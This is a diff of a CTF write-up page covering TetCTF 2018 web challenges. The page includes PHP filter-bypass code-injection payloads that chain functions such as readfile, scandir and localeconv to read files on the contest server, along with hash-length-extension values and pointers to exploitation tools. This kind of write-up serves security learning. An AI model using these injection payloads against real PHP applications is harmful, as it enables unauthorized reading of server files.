@@ -2,8 +2,7 @@
 
 ## Web - PHPlimit Revenge
 
-{% tabs %}
-{% tab title="filter.php" %}
+{% code title="filter.php" %}
 ```php
 <?php
 
@@ -25,15 +24,13 @@ else
 
 ?>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 I am not familiar with PHP code, but with a mindset of RE-er,...then JUST FUCKING DO IT!
 
 Btw, i joined after contest started for a while \(9 AM 4/1/2018\), so they already released the phplimit revenge 2, i just need to read which funcs are filtered by 2, and use it to create my payload
 
-{% tabs %}
-{% tab title="payload1" %}
+{% code title="payload1" %}
 ```python
 import requests
 
@@ -45,19 +42,15 @@ print r.content
 
 #view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
-{% tabs %}
-{% tab title="payload2" %}
+{% code title="payload2" %}
 ```text
 #view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
-{% tabs %}
-{% tab title="flag" %}
+{% code title="flag" %}
 ```text
 <?php 
 
@@ -65,13 +58,11 @@ $fl0wer="TetCTF{_Limbo_Escaped!_Welcome_back_to_Real_Life_}";
 
 ?>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Web - PHPlimit revenge 2
 
-{% tabs %}
-{% tab title="filter" %}
+{% code title="filter" %}
 ```php
 <?php
 
@@ -93,8 +84,7 @@ else
 
 ?>php
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 In this challenge, you couldnt use rand\(\) anymore, so to get ".", i use localeconv\(\)
 
@@ -141,7 +131,7 @@ I use sqrt\(50\) = 7.x
 
 I use ceil\(7.x\) = 8
 
-![](.gitbook/assets/image%20%28231%29.png)
+![](.gitbook/assets/image%20%28232%29.png)
 
 ord\('8'\) = 56
 
@@ -168,16 +158,13 @@ chr(46) = '.'
 
  From now on, it is similar to  phplimit revenge 1, just read flag, final payload :
 
-{% tabs %}
-{% tab title="final-payload" %}
+{% code title="final-payload" %}
 ```text
 view-source:http://45.76.181.81/?code=print(readfile(end(scandir(chr(octdec(ord(ceil(sqrt(ord(exp(chdir(next(scandir(current(localeconv())))))))))))))));
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
-{% tabs %}
-{% tab title="flag" %}
+{% code title="flag" %}
 ```text
 
 <?php
@@ -186,8 +173,7 @@ $flower="TetCTF{__Hey___PhP___Master___}";
 
 ?>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ```text
 Thanks @Ariana for teaching me thinking in multiple base/dimension
@@ -195,13 +181,11 @@ Thanks @Ariana for teaching me thinking in multiple base/dimension
 
 ## Web - IQ Test 2
 
-{% tabs %}
-{% tab title="challenge.php" %}
+{% code title="challenge.php" %}
 ```php
 https://pastebin.com/7zdc5DNX
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 This is a challenge about hash length extension, I used this tool below to calculate saved and hash for level13
 
@@ -211,14 +195,12 @@ https://github.com/iagox86/hash_extender
 
 ![](.gitbook/assets/image%20%2865%29.png)
 
-{% tabs %}
-{% tab title="payload" %}
+{% code title="payload" %}
 ```text
 hash: 6ac223512cea8d11c0fdf14dccbfbe62
 saved: c2VlZD10cnVlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAAAAAmbGV2ZWw9eGlpaQ==
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Now i have hash, have saved, so i created request with Burpsuite 
 
@@ -226,7 +208,7 @@ Now i have hash, have saved, so i created request with Burpsuite
 
 Finally
 
-![](.gitbook/assets/image%20%28189%29.png)
+![](.gitbook/assets/image%20%28190%29.png)
 
 ```text
 TetCTF{__Happy_new_Y3aR__!!_H3re_Your_Flower_}
@@ -246,19 +228,17 @@ Extract file /.DS\_Store with this tool
 https://github.com/lijiejie/ds_store_exp
 ```
 
-![](.gitbook/assets/image%20%28203%29.png)
+![](.gitbook/assets/image%20%28204%29.png)
 
 Check h1ddenn
 
-![](.gitbook/assets/image%20%28197%29.png)
+![](.gitbook/assets/image%20%28198%29.png)
 
-{% tabs %}
-{% tab title="flag" %}
+{% code title="flag" %}
 ```text
 TetCTF{__DS_Store__seems_sad__}
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 
 
@@ -268,7 +248,7 @@ My dream team! &lt;3
 
 
 
-![](.gitbook/assets/image%20%28186%29.png)
+![](.gitbook/assets/image%20%28187%29.png)
 
-![](.gitbook/assets/image%20%28216%29.png)
+![](.gitbook/assets/image%20%28217%29.png)
 
